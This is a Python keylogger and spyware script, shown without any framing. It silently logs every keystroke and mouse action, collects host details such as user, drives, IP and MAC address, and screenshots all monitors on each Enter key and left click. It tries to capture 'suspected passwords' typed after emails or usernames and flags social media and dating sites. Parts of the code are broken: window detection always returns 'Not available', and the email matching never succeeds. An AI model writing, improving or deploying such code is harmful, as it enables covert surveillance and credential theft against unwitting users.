import logging
import os
from datetime import datetime
import socket
import uuid
import subprocess
import re
import tempfile
import platform

try:
    from pynput import mouse, keyboard
except ImportError:
    mouse = keyboard = None

try:
    import psutil
except ImportError:
    psutil = None

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    requests = BeautifulSoup = None

try:
    import mss
except ImportError:
    mss = None

# Create directories for logs and screen captures
os.makedirs('Logs', exist_ok=True)
os.makedirs('Screen Captures', exist_ok=True)

# Get the current OS, date, and timestamp
os_name = platform.system()
current_datetime = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

# Configure logging
log_file = f'Logs/{os_name}_{current_datetime}.log'
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')


def get_machine_info():
    info = []
    info.append(f"Operating System: {platform.system()} {platform.release()}")

    if psutil:
        info.append(f"Network Type: {psutil.net_if_stats()}")
        info.append(f"User Account: {psutil.users()[0].name}")
        info.append(f"User Access Level: {psutil.Process().username()}")
        info.append(f"Drive Mappings: {psutil.disk_partitions()}")
        info.append(f"Drive Names: {[i.mountpoint for i in psutil.disk_partitions()]}")

    info.append(f"Domain: {socket.getfqdn()}")
    info.append(f"IPv4: {socket.gethostbyname(socket.gethostname())}")
    info.append(f"MAC Address: {':'.join(c + d for c, d in zip(*[iter(hex(uuid.getnode())[2:].zfill(12))] * 2))}")

    return '\n'.join(info)


def log_machine_info():
    logging.info("Machine Information:")
    logging.info(get_machine_info())
    logging.info("------------------------")


def get_webpage_source(url):
    if requests:
        try:
            response = requests.get(url)
            return response.text
        except:
            pass

    return None


def get_input_name(url, x, y):
    webpage_source = get_webpage_source(url)
    if BeautifulSoup and webpage_source:
        soup = BeautifulSoup(webpage_source, 'html.parser')
        elements = soup.find_all(lambda tag: tag.name == 'input' or tag.name == 'button')

        for element in elements:
            if element.has_attr('name'):
                input_name = element['name']
                input_rect = element.get('rect', {})
                input_x = int(input_rect.get('x', 0))
                input_y = int(input_rect.get('y', 0))
                input_width = int(input_rect.get('width', 0))
                input_height = int(input_rect.get('height', 0))

                if input_x <= x <= input_x + input_width and input_y <= y <= input_y + input_height:
                    return input_name

    return None


def get_window_info():
    return 'Not available'


def take_screenshot(process_name):
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    screenshot_dir = "Screen Captures"
    os.makedirs(screenshot_dir, exist_ok=True)

    with mss.mss() as sct:
        for i, monitor in enumerate(sct.monitors[1:], start=1):
            screenshot_name = f"{screenshot_dir}/{timestamp}_{process_name}_monitor{i}.png"
            sct.shot(mon=i, output=screenshot_name)


def is_social_media_url(url):
    social_media_urls = [
        'facebook.com', 'twitter.com', 'instagram.com', 'linkedin.com',
        'youtube.com', 'pinterest.com', 'reddit.com', 'tumblr.com',
        'vk.com', 'weibo.com', 'tiktok.com', 'snapchat.com',
        'twitch.tv', 'tinder.com', 'bumble.com', 'hinge.com'
    ]
    return any(
        url.lower().startswith(f'https://{sm}/') or url.lower().startswith(f'http://{sm}/') for sm in social_media_urls)


def extract_social_media_info(text):
    email_regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    username_regex = r'(?i)@[a-z0-9_]+'
    emails = re.findall(email_regex, text)
    usernames = re.findall(username_regex, text)
    return emails, usernames


def on_press(key):
    global active_window, active_url, suspected_password, password_entry_started

    window_info = get_window_info()
    process_name = window_info.split(' - ')[1] if ' - ' in window_info else 'unknown'
    log_entry = f'Key pressed: {key} - Process: {process_name} - Window Info: {window_info}'

    if isinstance(key, keyboard.KeyCode):
        emails, usernames = extract_social_media_info(key.char)
        if emails:
            log_entry += f' - Social Media Email(s): {", ".join(emails)}'
            active_window = window_info
            active_url = window_info.split(' - URL:')[-1].strip() if ' - URL:' in window_info else ''
            password_entry_started = True
            suspected_password = ''
        if usernames:
            log_entry += f' - Social Media Username(s): {", ".join(usernames)}'
            active_window = window_info
            active_url = window_info.split(' - URL:')[-1].strip() if ' - URL:' in window_info else ''
            password_entry_started = True
            suspected_password = ''

        if password_entry_started:
            if key == keyboard.Key.enter:
                log_entry += f' - Suspected Password: [{suspected_password}]'
                password_entry_started = False
            elif key == keyboard.Key.backspace:
                suspected_password = suspected_password[:-1]
            else:
                suspected_password += key.char

    log_entry = f'[Keyboard Input] {log_entry}'
    logging.info(log_entry)

    if key == keyboard.Key.enter:
        take_screenshot(process_name)


def on_release(key):
    window_info = get_window_info()
    process_name = window_info.split(' - ')[1] if ' - ' in window_info else 'unknown'
    log_entry = f'Key released: {key} - Process: {process_name} - Window Info: {window_info}'
    log_entry = f'[Keyboard Release] {log_entry}'
    logging.info(log_entry)


def on_move(x, y):
    window_info = get_window_info()
    process_name = window_info.split(' - ')[1] if ' - ' in window_info else 'unknown'
    log_entry = f'Mouse moved to ({x}, {y}) - Process: {process_name} - Window Info: {window_info}'

    if ' - URL:' in window_info:
        url = window_info.split(' - URL:')[-1].strip()
        input_name = get_input_name(url, x, y)
        if input_name:
            log_entry += f' - Input: ({input_name})'

    log_entry = f'[Mouse Movement] {log_entry}'
    logging.info(log_entry)


def on_click(x, y, button, pressed):
    global active_window, active_url, suspected_password, password_entry_started

    if pressed and button == mouse.Button.left:
        window_info = get_window_info()
        process_name = window_info.split(' - ')[1] if ' - ' in window_info else 'unknown'
        log_entry = f'Mouse clicked at ({x}, y) with {button} - Process: {process_name} - Window Info: {window_info}'

        if ' - URL:' in window_info:
            url = window_info.split(' - URL:')[-1].strip()
            input_name = get_input_name(url, x, y)
            if input_name:
                log_entry += f' - Input: ({input_name})'
                if input_name.lower() == 'login' or input_name.lower() == 'sign in':
                    log_entry += f' - Suspected Password: [{suspected_password}]'
                    password_entry_started = False

            if is_social_media_url(url):
                social_media_name = url.split('//')[1].split('/')[0].split('.')[0].capitalize()
                log_entry += f' - Social Media: {social_media_name}'

        log_entry = f'[Mouse Click] {log_entry}'
        logging.info(log_entry)
        take_screenshot(process_name)


def on_scroll(x, y, dx, dy):
    window_info = get_window_info()
    process_name = window_info.split(' - ')[1] if ' - ' in window_info else 'unknown'
    log_entry = f'Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy}) - Process: {process_name} - Window Info: {window_info}'
    log_entry = f'[Mouse Scroll] {log_entry}'
    logging.info(log_entry)


# Log machine information at the start of the script
log_machine_info()

# Initialize global variables
active_window = ''
active_url = ''
suspected_password = ''
password_entry_started = False

# Set up the listener threads if pynput is available
if mouse and keyboard:
    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    mouse_listener = mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)

    # Start the listener threads
    keyboard_listener.start()
    mouse_listener.start()

    # Keep the main thread running
    keyboard_listener.join()
    mouse_listener.join()
else:
    logging.info("pynput library is not available. Input monitoring will not be performed.")
